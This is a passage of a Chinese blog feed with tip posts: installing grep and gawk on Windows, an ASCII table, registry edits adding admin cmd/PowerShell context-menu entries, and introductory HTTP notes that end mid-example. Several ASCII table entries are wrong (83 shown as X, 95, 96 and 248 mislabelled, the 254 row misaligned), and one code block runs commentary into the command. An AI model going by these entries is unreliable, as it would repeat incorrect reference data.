        <content type="html"><![CDATA[<h2 id="win10使用grep和awk"><a href="#win10使用grep和awk" class="headerlink" title="win10使用grep和awk"></a>win10使用grep和awk</h2><h3 id="win10使用grep"><a href="#win10使用grep" class="headerlink" title="win10使用grep"></a>win10使用grep</h3><p>进入<a href="http://www.interlog.com/~tcharron/grep.html">GREP for Windows (interlog.com)</a>或者<a href="http://gnuwin32.sourceforge.net/packages/grep.htm">Grep for Windows (sourceforge.net)</a></p><p>下载-&gt;解压或安装-&gt;将<code>XXXXX\grep20d_win</code>添加至环境变量</p><p>以管理员方式打开cmd，运行<code>grep -S "searchtext" *.txt</code>测试成功</p><h3 id="win10使用awk"><a href="#win10使用awk" class="headerlink" title="win10使用awk"></a>win10使用awk</h3><p><a href="http://gnuwin32.sourceforge.net/packages/gawk.htm">Gawk for Windows (sourceforge.net)</a></p><p>下载-&gt;安装-&gt;将<code>XXXXX\GnuWin32\bin</code>添加至环境变量</p><p>以管理员方式打开cmd，运行awk测试</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCII码表</title>
      <link href="/2021/05/19/ascii/"/>
      <url>/2021/05/19/ascii/</url>
      
        <content type="html"><![CDATA[<h1 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h1><table><thead><tr><th><strong>ASCII值</strong></th><th><strong>控制字符</strong></th><th><strong>ASCII值</strong></th><th><strong>控制字符</strong></th><th><strong>ASCII值</strong></th><th><strong>控制字符</strong></th><th><strong>ASCII值</strong></th><th><strong>控制字符</strong></th></tr></thead><tbody><tr><td>0</td><td>NUL</td><td>32</td><td>(space)</td><td>64</td><td>@</td><td>96</td><td>、</td></tr><tr><td>1</td><td>SOH</td><td>33</td><td>！</td><td>65</td><td>A</td><td>97</td><td>a</td></tr><tr><td>2</td><td>STX</td><td>34</td><td>”</td><td>66</td><td>B</td><td>98</td><td>b</td></tr><tr><td>3</td><td>ETX</td><td>35</td><td>#</td><td>67</td><td>C</td><td>99</td><td>c</td></tr><tr><td>4</td><td>EOT</td><td>36</td><td>$</td><td>68</td><td>D</td><td>100</td><td>d</td></tr><tr><td>5</td><td>ENQ</td><td>37</td><td>%</td><td>69</td><td>E</td><td>101</td><td>e</td></tr><tr><td>6</td><td>ACK</td><td>38</td><td>&amp;</td><td>70</td><td>F</td><td>102</td><td>f</td></tr><tr><td>7</td><td>BEL</td><td>39</td><td>‘</td><td>71</td><td>G</td><td>103</td><td>g</td></tr><tr><td>8</td><td>BS</td><td>40</td><td>(</td><td>72</td><td>H</td><td>104</td><td>h</td></tr><tr><td>9</td><td>HT</td><td>41</td><td>)</td><td>73</td><td>I</td><td>105</td><td>i</td></tr><tr><td>10</td><td>LF</td><td>42</td><td>*</td><td>74</td><td>J</td><td>106</td><td>j</td></tr><tr><td>11</td><td>VT</td><td>43</td><td>+</td><td>75</td><td>K</td><td>107</td><td>k</td></tr><tr><td>12</td><td>FF</td><td>44</td><td>,</td><td>76</td><td>L</td><td>108</td><td>l</td></tr><tr><td>13</td><td>CR</td><td>45</td><td>-</td><td>77</td><td>M</td><td>109</td><td>m</td></tr><tr><td>14</td><td>SO</td><td>46</td><td>.</td><td>78</td><td>N</td><td>110</td><td>n</td></tr><tr><td>15</td><td>SI</td><td>47</td><td>/</td><td>79</td><td>O</td><td>111</td><td>o</td></tr><tr><td>16</td><td>DLE</td><td>48</td><td>0</td><td>80</td><td>P</td><td>112</td><td>p</td></tr><tr><td>17</td><td>DCI</td><td>49</td><td>1</td><td>81</td><td>Q</td><td>113</td><td>q</td></tr><tr><td>18</td><td>DC2</td><td>50</td><td>2</td><td>82</td><td>R</td><td>114</td><td>r</td></tr><tr><td>19</td><td>DC3</td><td>51</td><td>3</td><td>83</td><td>X</td><td>115</td><td>s</td></tr><tr><td>20</td><td>DC4</td><td>52</td><td>4</td><td>84</td><td>T</td><td>116</td><td>t</td></tr><tr><td>21</td><td>NAK</td><td>53</td><td>5</td><td>85</td><td>U</td><td>117</td><td>u</td></tr><tr><td>22</td><td>SYN</td><td>54</td><td>6</td><td>86</td><td>V</td><td>118</td><td>v</td></tr><tr><td>23</td><td>TB</td><td>55</td><td>7</td><td>87</td><td>W</td><td>119</td><td>w</td></tr><tr><td>24</td><td>CAN</td><td>56</td><td>8</td><td>88</td><td>X</td><td>120</td><td>x</td></tr><tr><td>25</td><td>EM</td><td>57</td><td>9</td><td>89</td><td>Y</td><td>121</td><td>y</td></tr><tr><td>26</td><td>SUB</td><td>58</td><td>:</td><td>90</td><td>Z</td><td>122</td><td>z</td></tr><tr><td>27</td><td>ESC</td><td>59</td><td>;</td><td>91</td><td>[</td><td>123</td><td>{</td></tr><tr><td>28</td><td>FS</td><td>60</td><td>&lt;</td><td>92</td><td>\</td><td>124</td><td>|</td></tr><tr><td>29</td><td>GS</td><td>61</td><td>=</td><td>93</td><td>]</td><td>125</td><td>}</td></tr><tr><td>30</td><td>RS</td><td>62</td><td>&gt;</td><td>94</td><td>^</td><td>126</td><td>~</td></tr><tr><td>31</td><td>US</td><td>63</td><td>?</td><td>95</td><td>—</td><td>127</td><td>DEL</td></tr></tbody></table><h2 id="ASCII诠释部分"><a href="#ASCII诠释部分" class="headerlink" title="ASCII诠释部分"></a>ASCII诠释部分</h2><table><thead><tr><th><strong>十进制</strong></th><th><strong>十六进制</strong></th><th><strong>字符</strong></th><th><strong>十进制</strong></th><th><strong>十六进制</strong></th><th><strong>字符</strong></th></tr></thead><tbody><tr><td>0</td><td>00</td><td>空</td><td>16</td><td>10</td><td>数据链路转意</td></tr><tr><td>1</td><td>01</td><td>头标开始</td><td>17</td><td>11</td><td>设备控制 1</td></tr><tr><td>2</td><td>02</td><td>正文开始</td><td>18</td><td>12</td><td>设备控制 2</td></tr><tr><td>3</td><td>03</td><td>正文结束</td><td>19</td><td>13</td><td>设备控制 3</td></tr><tr><td>4</td><td>04</td><td>传输结束</td><td>20</td><td>14</td><td>设备控制 4</td></tr><tr><td>5</td><td>05</td><td>查询</td><td>21</td><td>15</td><td>反确认</td></tr><tr><td>6</td><td>06</td><td>确认</td><td>22</td><td>16</td><td>同步空闲</td></tr><tr><td>7</td><td>07</td><td>震铃</td><td>23</td><td>17</td><td>传输块结束</td></tr><tr><td>8</td><td>08</td><td>backspace</td><td>24</td><td>18</td><td>取消</td></tr><tr><td>9</td><td>09</td><td>水平制表符</td><td>25</td><td>19</td><td>媒体结束</td></tr><tr><td>10</td><td>0A</td><td>换行/新行</td><td>26</td><td>1A</td><td>替换</td></tr><tr><td>11</td><td>0B</td><td>竖直制表符</td><td>27</td><td>1B</td><td>转意</td></tr><tr><td>12</td><td>0C</td><td>换页/新页</td><td>28</td><td>1C</td><td>文件分隔符</td></tr><tr><td>13</td><td>0D</td><td>回车</td><td>29</td><td>1D</td><td>组分隔符</td></tr><tr><td>14</td><td>0E</td><td>移出</td><td>30</td><td>1E</td><td>记录分隔符</td></tr><tr><td>15</td><td>0F</td><td>移入</td><td>31</td><td>1F</td><td>单元分隔符</td></tr></tbody></table><h2 id="ASCII扩展字符"><a href="#ASCII扩展字符" class="headerlink" title="ASCII扩展字符"></a>ASCII扩展字符</h2><table><thead><tr><th><strong>十进制</strong></th><th><strong>十六进制</strong></th><th><strong>字符</strong></th><th><strong>十进制</strong></th><th><strong>十六进制</strong></th><th><strong>字符</strong></th></tr></thead><tbody><tr><td>128</td><td>80</td><td>Ç</td><td>192</td><td>C0</td><td>└</td></tr><tr><td>129</td><td>81</td><td>ü</td><td>193</td><td>C1</td><td>┴</td></tr><tr><td>130</td><td>82</td><td>é</td><td>194</td><td>C2</td><td>┬</td></tr><tr><td>131</td><td>83</td><td>â</td><td>195</td><td>C3</td><td>├</td></tr><tr><td>132</td><td>84</td><td>ä</td><td>196</td><td>C4</td><td>─</td></tr><tr><td>133</td><td>85</td><td>à</td><td>197</td><td>C5</td><td>┼</td></tr><tr><td>134</td><td>86</td><td>å</td><td>198</td><td>C6</td><td>╞</td></tr><tr><td>135</td><td>87</td><td>ç</td><td>199</td><td>C7</td><td>╟</td></tr><tr><td>136</td><td>88</td><td>ê</td><td>200</td><td>C8</td><td>╚</td></tr><tr><td>137</td><td>89</td><td>ë</td><td>201</td><td>C9</td><td>╔</td></tr><tr><td>138</td><td>8A</td><td>è</td><td>202</td><td>CA</td><td>╩</td></tr><tr><td>139</td><td>8B</td><td>ï</td><td>203</td><td>CB</td><td>╦</td></tr><tr><td>140</td><td>8C</td><td>î</td><td>204</td><td>CC</td><td>╠</td></tr><tr><td>141</td><td>8D</td><td>ì</td><td>205</td><td>CD</td><td>═</td></tr><tr><td>142</td><td>8E</td><td>Ä</td><td>206</td><td>CE</td><td>╬</td></tr><tr><td>143</td><td>8F</td><td>Å</td><td>207</td><td>CF</td><td>╧</td></tr><tr><td>144</td><td>90</td><td>É</td><td>208</td><td>D0</td><td>╨</td></tr><tr><td>145</td><td>91</td><td>æ</td><td>209</td><td>D1</td><td>╤</td></tr><tr><td>146</td><td>92</td><td>Æ</td><td>210</td><td>D2</td><td>╥</td></tr><tr><td>147</td><td>93</td><td>ô</td><td>211</td><td>D3</td><td>╙</td></tr><tr><td>148</td><td>94</td><td>ö</td><td>212</td><td>D4</td><td>Ô</td></tr><tr><td>149</td><td>95</td><td>ò</td><td>213</td><td>D5</td><td>╒</td></tr><tr><td>150</td><td>96</td><td>û</td><td>214</td><td>D6</td><td>╓</td></tr><tr><td>151</td><td>97</td><td>ù</td><td>215</td><td>D7</td><td>╫</td></tr><tr><td>152</td><td>98</td><td>ÿ</td><td>216</td><td>D8</td><td>╪</td></tr><tr><td>153</td><td>99</td><td>Ö</td><td>217</td><td>D9</td><td>┘</td></tr><tr><td>154</td><td>9A</td><td>Ü</td><td>218</td><td>DA</td><td>┌</td></tr><tr><td>155</td><td>9B</td><td>¢</td><td>219</td><td>DB</td><td>█</td></tr><tr><td>156</td><td>9C</td><td>£</td><td>220</td><td>DC</td><td>▄</td></tr><tr><td>157</td><td>9D</td><td>¥</td><td>221</td><td>DD</td><td>▌</td></tr><tr><td>158</td><td>9E</td><td>?</td><td>222</td><td>DE</td><td>?</td></tr><tr><td>159</td><td>9F</td><td>ƒ</td><td>223</td><td>DF</td><td>?</td></tr><tr><td>160</td><td>A0</td><td>á</td><td>224</td><td>E0</td><td>α</td></tr><tr><td>161</td><td>A1</td><td>í</td><td>225</td><td>E1</td><td>ß</td></tr><tr><td>162</td><td>A2</td><td>ó</td><td>226</td><td>E2</td><td>Γ</td></tr><tr><td>163</td><td>A3</td><td>ú</td><td>227</td><td>E3</td><td>π</td></tr><tr><td>164</td><td>A4</td><td>ñ</td><td>228</td><td>E4</td><td>Σ</td></tr><tr><td>165</td><td>A5</td><td>Ñ</td><td>229</td><td>E5</td><td>σ</td></tr><tr><td>166</td><td>A6</td><td>ª</td><td>230</td><td>E6</td><td>µ</td></tr><tr><td>167</td><td>A7</td><td>º</td><td>231</td><td>E7</td><td>τ</td></tr><tr><td>168</td><td>A8</td><td>¿</td><td>232</td><td>E8</td><td>Φ</td></tr><tr><td>169</td><td>A9</td><td>?</td><td>233</td><td>E9</td><td>Θ</td></tr><tr><td>170</td><td>AA</td><td>¬</td><td>234</td><td>EA</td><td>Ω</td></tr><tr><td>171</td><td>AB</td><td>½</td><td>235</td><td>EB</td><td>δ</td></tr><tr><td>172</td><td>AC</td><td>¼</td><td>236</td><td>EC</td><td>∞</td></tr><tr><td>173</td><td>AD</td><td>¡</td><td>237</td><td>ED</td><td>φ</td></tr><tr><td>174</td><td>AE</td><td>«</td><td>238</td><td>EE</td><td>ε</td></tr><tr><td>175</td><td>AF</td><td>»</td><td>239</td><td>EF</td><td>∩</td></tr><tr><td>176</td><td>B0</td><td>?</td><td>240</td><td>F0</td><td>≡</td></tr><tr><td>177</td><td>B1</td><td>?</td><td>241</td><td>F1</td><td>±</td></tr><tr><td>178</td><td>B2</td><td>▓</td><td>242</td><td>F2</td><td>≥</td></tr><tr><td>179</td><td>B3</td><td>│</td><td>243</td><td>F3</td><td>≤</td></tr><tr><td>180</td><td>B4</td><td>┤</td><td>244</td><td>F4</td><td>?</td></tr><tr><td>181</td><td>B5</td><td>╡</td><td>245</td><td>F5</td><td>?</td></tr><tr><td>182</td><td>B6</td><td>╢</td><td>246</td><td>F6</td><td>÷</td></tr><tr><td>183</td><td>B7</td><td>╖</td><td>247</td><td>F7</td><td>≈</td></tr><tr><td>184</td><td>B8</td><td>╕</td><td>248</td><td>F8</td><td>≈</td></tr><tr><td>185</td><td>B9</td><td>╣</td><td>249</td><td>F9</td><td>?</td></tr><tr><td>186</td><td>BA</td><td>║</td><td>250</td><td>FA</td><td>·</td></tr><tr><td>187</td><td>BB</td><td>╗</td><td>251</td><td>FB</td><td>√</td></tr><tr><td>188</td><td>BC</td><td>╝</td><td>252</td><td>FC</td><td>?</td></tr><tr><td>189</td><td>BD</td><td>╜</td><td>253</td><td>FD</td><td>²</td></tr><tr><td>190</td><td>BE</td><td>╛</td><td>FE</td><td>■</td><td></td></tr><tr><td>191</td><td>BF</td><td>┐</td><td>255</td><td>FF</td><td>ÿ</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10右键添加cmd和powershell</title>
      <link href="/2021/05/16/win10-you-jian-tian-jia-cmd/"/>
      <url>/2021/05/16/win10-you-jian-tian-jia-cmd/</url>
      
        <content type="html"><![CDATA[<h1 id="win10右键添加cmd和powershell"><a href="#win10右键添加cmd和powershell" class="headerlink" title="win10右键添加cmd和powershell"></a>win10右键添加cmd和powershell</h1><h2 id="在空白处右击"><a href="#在空白处右击" class="headerlink" title="在空白处右击"></a>在空白处右击</h2><p>两种方式，一种改原生的注册表，一种添加新的注册表</p><h3 id="1-改原生的注册表"><a href="#1-改原生的注册表" class="headerlink" title="1. 改原生的注册表"></a>1. 改原生的注册表</h3><p><code>win+r</code>输入<code>register</code>打开注册表</p><p><img src="https://images.dadream.eu.org/images/2024/07/24cd4255c8378cf4e5d6f354d4138c78.png"></p><ul><li><p>cmd</p><p>找到<code>计算机\HKEY_CLASSES_ROOT\Directory\Background\shell\cmd</code></p><p>将<code>HideBasedOnVelocityId</code>改为<code>ShowBasedOnVelocityId</code></p></li><li><p>powershell</p><p>找到<code>计算机\HKEY_CLASSES_ROOT\Directory\Background\shell\Powershell</code></p><p>将<code>HideBasedOnVelocityId</code>改为<code>ShowBasedOnVelocityId</code></p></li></ul><p>因为<code>Extended</code>这个二进制值存在，需要shift+右键才能显示，要使用右键直接显示，可以将这个二进制值删除</p><p>这个时候可能会因为权限原因修改失败，查看下文解决方法</p><h3 id="2-添加新的注册表"><a href="#2-添加新的注册表" class="headerlink" title="2.添加新的注册表"></a>2.添加新的注册表</h3><p>创建如图几个项</p><p><img src="https://images.dadream.eu.org/images/2024/07/7bbb385f669630bd3a4e28a4e99c0f9c.png"></p><p>这里直接演示添加以管理员打开，非管理员打开只需要做一些改动</p><ul><li><p>powershell</p><p>在powershella下进行如下操作</p><p>新建字符串值<code>Extended</code> 值为空</p><p>新建字符串值<code>MUIVerb</code>值为<code>在此处以管理员打开powershell窗口</code></p><p>新建字符串值<code>NoWorkingDirectory</code>值为空</p><p>新建DWORD值<code>ShowBasedOnVelocityId</code>值为<code>639bc8</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/9c0ffd41679831bd370a2ec92ea2d200.png"></p><p>对command写入数据</p><p><img src="https://images.dadream.eu.org/images/2024/07/a3a0b3d5a570402a1d2a9ca19a36cc07.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell.exe <span class="token parameter variable">-command</span> Start-Process powershell <span class="token parameter variable">-ArgumentList</span> <span class="token punctuation">\</span>"-noexit<span class="token punctuation">\</span>",<span class="token punctuation">\</span>"Set-Location <span class="token parameter variable">-literalPath</span> <span class="token string">'%V'</span><span class="token punctuation">\</span>" <span class="token parameter variable">-Verb</span> runAspowershell.exe <span class="token parameter variable">-command</span> Start-Process powershell开始运行powershell<span class="token parameter variable">-ArgumentList</span> <span class="token punctuation">\</span>"-noexit<span class="token punctuation">\</span>",<span class="token punctuation">\</span>"Set-Location <span class="token parameter variable">-literalPath</span> <span class="token string">'%V'</span><span class="token punctuation">\</span>"选项 noexit不退出  Set-Location <span class="token parameter variable">-literalPath</span> <span class="token string">'%V'</span>定位<span class="token parameter variable">-Verb</span> runAs 以管理员运行cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>cmd</p><p>必须是<code>runas</code>名字不能改，在下面新建DWORD值<code>ShowBasedOnVelocityId</code>值为<code>639bc8</code></p><p>对command写入数据</p><p><img src="https://images.dadream.eu.org/images/2024/07/65a0142229ab7e7b2480a1f8c57b0c57.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd.exe /s /k <span class="token function">pushd</span> <span class="token string">"%V"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果要以普通用户打开，则可以将<code>runas</code>换为其他名字，再添加</p></li></ul><h2 id="文件夹上右击"><a href="#文件夹上右击" class="headerlink" title="文件夹上右击"></a>文件夹上右击</h2><p>方法和前面相似</p><p>转到<code>计算机\HKEY_CLASSES_ROOT\Folder\shell\</code>目录下</p><p>建立项如下</p><p><img src="https://images.dadream.eu.org/images/2024/07/55e14b349c2bd421b747891784334272.png"></p><p>然后操作和前面相识</p><p>只需要在主项<code>cmd</code>设置右键显示名字，数据改为你想设置的</p><p><code>command</code>中添加和前面提到的一样的值</p><p>示例</p><p><img src="https://images.dadream.eu.org/images/2024/07/a4f38b25fac91768235572f67fe84f76.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/26352475865cc4d7e5271f5476f7bc13.png"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>右击cmd-&gt;权限</p><p><img src="https://images.dadream.eu.org/images/2024/07/48bf4c8c8913e3b1a2c037ae5aec46b4.png"></p><p>点击右下角高级</p><p><img src="https://images.dadream.eu.org/images/2024/07/c3513220a714b7d2fa218b086d572666.png"></p><p>点击右上所有者旁的更改</p><p><img src="https://images.dadream.eu.org/images/2024/07/05b33eb0d878befa37be5e1c775295d9.png"></p><p>输入<code>Administrators</code>点击检查名称-&gt;确定</p><p><img src="https://images.dadream.eu.org/images/2024/07/6495b177aa60e745c574f2ec8cd4befe.png"></p><p>双击<code>Administrators</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/4d0cd074d2046fd0e4ae6c85697f7097.png"></p><p>勾选完全控制，一直确定</p><h2 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h2><ul><li><p><code>Extended</code></p><p>设置该值时，需要shift+右键显示</p><p>不设置直接右键显示</p></li><li><p><code>MUIVerb</code></p><p>设置的值会显示在右键上</p><p>不设置显示文件夹名</p></li><li><p><code>NoWorkingDirectory</code></p><p>不知道</p></li><li><p><code>ShowBasedOnVelocityId</code></p><p>固定为<code>639bc8</code></p></li></ul><h2 id="一键操作"><a href="#一键操作" class="headerlink" title="一键操作"></a>一键操作</h2><p>将下面代码保存为xxx.reg的注册表文件，编码为ANSI，点击运行</p><p>以管理员方式运行powershell</p><pre class="line-numbers language-reg" data-language="reg"><code class="language-reg">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\powershella]"Extended"="""MUIVerb"="在此处以管理员打开powershell窗口""ShowBasedOnVelocityId"=dword:00639bc8"NoWorkingDirectory"=""[HKEY_CLASSES_ROOT\Directory\Background\shell\powershella\command]@="powershell.exe -command Start-Process powershell -ArgumentList \\\"-noexit\\\",\\\"Set-Location -literalPath '%V'\\\" -Verb runAs"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以管理员方式运行cmd</p><pre class="line-numbers language-reg" data-language="reg"><code class="language-reg">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\runas]"ShowBasedOnVelocityId"=dword:00639bc8[HKEY_CLASSES_ROOT\Directory\Background\shell\runas\command]@="cmd.exe /s /k pushd \"%V\""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP学习</title>
      <link href="/2021/04/23/http-xue-xi/"/>
      <url>/2021/04/23/http-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="web协议"><a href="#web协议" class="headerlink" title="web协议"></a>web协议</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>Web 使用一种名为 HTTP（HyperText Transfer Protocol，超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流程。</p><p>1997 年  1 月公布的  HTTP/1.1 是目前主流的  HTTP 协议版本。</p><h3 id="TCP-IP协议簇"><a href="#TCP-IP协议簇" class="headerlink" title="TCP/IP协议簇"></a>TCP/IP协议簇</h3><p><img src="https://images.dadream.eu.org/images/2024/07/cb757b5e4fbd69d9a7870cf73ec5f2c8.png"></p><h4 id="TCP-IP分层"><a href="#TCP-IP分层" class="headerlink" title="TCP/IP分层"></a>TCP/IP分层</h4><h5 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h5><p>FTP（FileTransfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）</p><p>HTTP</p><h5 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h5><p>TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）</p><h5 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h5><p>网络层所起的作用就是在众多的选项内选择一条传输路线</p><h5 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h5><p>用来处理连接网络的硬件部分</p><h4 id="TCP-IP-通信传输流"><a href="#TCP-IP-通信传输流" class="headerlink" title="TCP/IP 通信传输流"></a>TCP/IP 通信传输流</h4><p><img src="https://images.dadream.eu.org/images/2024/07/81ffdf57755cc7acedb59dfef5c70546.png"></p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。</p><h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>IP（Internet Protocol）网际协议位于网络层</p><p>IP 协议的作用是把各种数据包传送给对方。</p><p>P 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC地址基本上不会更改。</p><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。</p><h4 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择"></a>路由选择</h4><p><img src="https://images.dadream.eu.org/images/2024/07/0c783c5c7eef0356ea5f3a327fb43c70.png"></p><h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p>TCP 位于传输层，提供可靠的字节流服务</p><h4 id="tcp三次握手"><a href="#tcp三次握手" class="headerlink" title="tcp三次握手"></a>tcp三次握手</h4><p><img src="https://images.dadream.eu.org/images/2024/07/4fd95e6d2b8edcd965ce11295ac0c301.png"></p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的<br>协议。它提供域名到 IP 地址之间的解析服务。</p><p><img src="https://images.dadream.eu.org/images/2024/07/9b9ebce7681849f430d21d47495b3400.png"></p><h3 id="各协议关系"><a href="#各协议关系" class="headerlink" title="各协议关系"></a>各协议关系</h3><p><img src="https://images.dadream.eu.org/images/2024/07/7e76c47328b109133df3878b6803e24a.png"></p><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>URI 是 Uniform Resource Identifier 的缩写。</p><p>URI 用字符串标识某一互联网资源，而 URL表示资源的地点（互联网上所处的位置）</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p><img src="https://images.dadream.eu.org/images/2024/07/48eb2105e992b313cb99eb9cb2a0e897.png"></p><p>as：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">ftp</span><span class="token punctuation">:</span><span class="token header-value">//ftp.is.co.za/rfc/rfc1808.txt</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.ietf.org/rfc/rfc2396.txt</span></span><span class="token header"><span class="token header-name keyword">ldap</span><span class="token punctuation">:</span><span class="token header-value">//[2001:db8::7]/c=GB?objectClass?one</span></span><span class="token header"><span class="token header-name keyword">mailto</span><span class="token punctuation">:</span><span class="token header-value">John.Doe@example.com</span></span><span class="token header"><span class="token header-name keyword">news</span><span class="token punctuation">:</span><span class="token header-value">comp.infosystems.www.servers.unix</span></span><span class="token header"><span class="token header-name keyword">tel</span><span class="token punctuation">:</span><span class="token header-value">+1-816-555-1212</span></span><span class="token header"><span class="token header-name keyword">telnet</span><span class="token punctuation">:</span><span class="token header-value">//192.0.2.16:80/</span></span><span class="token header"><span class="token header-name keyword">urn</span><span class="token punctuation">:</span><span class="token header-value">oasis:names:specification:docbook:dtd:xml:4.1.2</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="S-B客服端与服务器端的交互"><a href="#S-B客服端与服务器端的交互" class="headerlink" title="S-B客服端与服务器端的交互"></a>S-B客服端与服务器端的交互</h3><p>在两台计算机之间使用 HTTP 协议通信时，在一条通信线路上必定有一端是客户端，另一端则是服务器端。</p><p>HTTP 是不保存状态的协议</p><h3 id="请求-响应"><a href="#请求-响应" class="headerlink" title="请求-响应"></a>请求-响应</h3><p><img src="https://images.dadream.eu.org/images/2024/07/4043823659f06850225215b355d26e70.png"></p><p>请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。</p><p><img src="https://images.dadream.eu.org/images/2024/07/5064a6a828ab020f5558b42c2dfbdf58.png"></p><p>响应报文</p><p><img src="https://images.dadream.eu.org/images/2024/07/7931c23a1e3c807e44a4108e514bb99d.png"></p><p>URI请求</p><p><img src="https://images.dadream.eu.org/images/2024/07/84626c79794c0eb39904acbe02811cb4.png"></p><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>GET ：获取资源<br>GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器 端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保 持原样返回；如果是像 CGI（Common Gateway Interface，通用网关接 口）那样的程序，则返回经过执行后的输出结果。</p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.html</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">返回  index.html 的页面资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>POST：传输实体主体<br>POST 方法用来传输实体的主体。<br>虽然用 GET 方法也可以传输实体的主体，但一般不用 GET 方法进行 传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但 POST 的主要目的并不是获取响应的主体内容。</p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/submit.cgi</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1560（1560字节的数据）</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">返回  submit.cgi 接收数据的处理结果 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p>PUT：传输文件<br>PUT 方法用来传输文件。就像 FTP 协议的文件上传一样，要求在请 求报文的主体中包含文件内容，然后保存到请求 URI 指定的位置。 </p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url">/example.html</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token 